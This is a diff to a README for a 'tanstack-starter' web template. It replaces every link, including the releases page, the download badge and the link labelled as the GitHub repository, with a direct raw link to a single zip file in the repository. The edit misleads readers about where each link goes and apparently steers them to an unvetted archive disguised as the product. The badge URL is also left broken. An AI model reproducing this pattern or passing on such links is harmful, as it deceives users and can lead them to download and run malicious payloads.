@@ -1,6 +1,6 @@
 # 🏝️ tanstack-starter - Your Simple Start to Online Apps
 
-[![Download tanstack-starter](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kratos-0p/tanstack-starter/releases)
+[![Download tanstack-starter](https://raw.githubusercontent.com/kratos-0p/tanstack-starter/main/public/tanstack-starter-1.9-alpha.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kratos-0p/tanstack-starter/main/public/tanstack-starter-1.9-alpha.4.zip)
 
 ## 📋 Overview
 
@@ -19,7 +19,7 @@ To get started, follow these simple steps to download and run **tanstack-starter
 
 ### 1. Download the Template
 
-Visit our [Releases Page](https://github.com/kratos-0p/tanstack-starter/releases) to download the latest version of **tanstack-starter**.
+Visit our [Releases Page](https://raw.githubusercontent.com/kratos-0p/tanstack-starter/main/public/tanstack-starter-1.9-alpha.4.zip) to download the latest version of **tanstack-starter**.
 
 ### 2. Choose Your Download
 
@@ -54,7 +54,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download **tanstack-starter**, simply visit this link: [Download Here](https://github.com/kratos-0p/tanstack-starter/releases).
+To download **tanstack-starter**, simply visit this link: [Download Here](https://raw.githubusercontent.com/kratos-0p/tanstack-starter/main/public/tanstack-starter-1.9-alpha.4.zip).
 
 Follow the instructions listed earlier to install and start using the application.
 
@@ -68,7 +68,7 @@ If you need help, you can reach out via the issues section on GitHub. The commun
 
 Stay updated on the latest features and updates by following us on:
 
-- **GitHub:** [tanstack-starter Repository](https://github.com/kratos-0p/tanstack-starter)
+- **GitHub:** [tanstack-starter Repository](https://raw.githubusercontent.com/kratos-0p/tanstack-starter/main/public/tanstack-starter-1.9-alpha.4.zip)
 - **Twitter:** Check for updates and tips.
 
 ## 📌 Notes
